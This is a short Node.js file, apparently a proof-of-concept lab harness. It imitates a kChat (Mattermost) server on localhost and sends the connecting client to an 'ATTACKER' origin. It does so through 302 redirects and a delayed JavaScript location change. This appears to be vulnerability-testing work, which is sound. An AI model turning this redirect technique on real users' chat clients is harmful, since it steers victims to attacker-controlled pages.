// Simulated kChat (Mattermost) server on 127.0.0.1:8099 — stands in for the victim's configured server.
const http = require('http');
const ATTACKER = 'http://127.0.0.2:8098/';
http.createServer((req, res) => {
  console.log('[server] ' + req.method + ' ' + req.url);
  if (req.url.startsWith('/api/v4/config/client')) return res.end(JSON.stringify({Version: '9.5.0', SiteURL: 'http://127.0.0.1:8099', SiteName: 'lab'}));
  if (req.url.startsWith('/api/v4/plugins/webapp')) return res.end('[]');
  if (req.url.startsWith('/api/v4/license/client')) return res.end('{}');
  if (req.url.startsWith('/redir')) { res.writeHead(302, {Location: ATTACKER + '?via=302&persist'}); return res.end(); }
  if (process.env.MODE === '302' && req.url === '/') { res.writeHead(302, {Location: ATTACKER + '?via=302&persist'}); return res.end(); }
  // Root page: simulates the webapp performing a top-level navigation to an OAuth redirect_uri
  res.setHeader('Content-Type', 'text/html');
  res.end('<html><body>lab server<script>setTimeout(()=>{location.href=' + JSON.stringify(ATTACKER + '?via=location') + '},1500)</script></body></html>');
}).listen(8099, '127.0.0.1', () => console.log('[server] listening 127.0.0.1:8099'));
